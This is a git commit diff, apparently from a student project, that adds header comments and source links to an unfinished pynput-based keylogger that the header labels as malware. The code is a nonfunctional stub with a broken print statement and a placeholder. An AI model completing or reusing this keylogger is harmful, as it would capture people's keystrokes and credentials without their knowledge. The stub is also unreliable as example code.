0717ced548471c55083981868b12214952606f19
Alyssa Chiego <abmccurdy7151@eagle.fgcu.edu>
2024-07-25 00:31:17 -0400

    block header & block sources

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,14 @@
+#---------------------------------------------------------
+# File: keylogger.py
+# Author(s): Alyssa Chiego
+# Purpose: malware that tracks and logs keboard input
+# Audit: 07.24.24 AC // 07.25.24 AC
+#---------------------------------------------------------
+
+
 from pynput import keyboard
 
-# prints typed key in terminal
+# prints typed key in terminal & creates .txt file
 def keyPressed(key):
     # {0} refers to (key)
     print("{0} pressed")
@@ -11,3 +19,15 @@ def keyPressed(key):
             print("Code Here")
         except:
              print("ERROR")
+
+# need a keyReleased() func??
+
+
+
+#---------------------------------------------------------
+#Sources:
+#  https://pynput.readthedocs.io/en/latest/keyboard.html
+#  https://pypi.org/project/pynput/
+#  https://stackoverflow.com/questions/1466000/difference-between-modes-a-a-w-w-and-r-in-built-in-open-function
+#  https://www.geeksforgeeks.org/how-to-use-pynput-to-make-a-keylogger/
+#---------------------------------------------------------
